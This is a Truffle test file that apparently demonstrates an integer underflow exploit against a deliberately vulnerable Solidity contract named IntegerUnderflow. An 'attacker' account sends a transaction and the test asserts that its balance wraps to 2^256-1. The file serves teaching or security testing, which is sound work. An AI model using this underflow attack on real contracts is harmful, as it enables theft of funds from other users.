const IntegerUnderflow = artifacts.require('IntegerUnderflow');

const BN = n => new web3.utils.BN(n);

contract('IntegerUnderflow', accounts => {
    let victim;
    const attacker = accounts[0];

    before(async () => {
        victim = await IntegerUnderflow.deployed();
    });

    it('IntegerUnderflow', async () => {
        const attackerBalance = await victim.getBalance(attacker);
        assert.equal(attackerBalance, 0, 'Incorrect ETH balance of the attacker account');

        await web3.eth.sendTransaction({
            from: attacker,
            to: victim.address,
            value: 999999
        });

        const attackerBalanceAfter = await victim.getBalance(attacker);
        const expectedAttackerBalanceAfter = BN(2).pow(BN(256)).sub(BN(1));
        assert.equal(BN(attackerBalanceAfter).toString(), expectedAttackerBalanceAfter.toString(), 'Incorrect ETH balance of the attacker account after attack');
    });
});
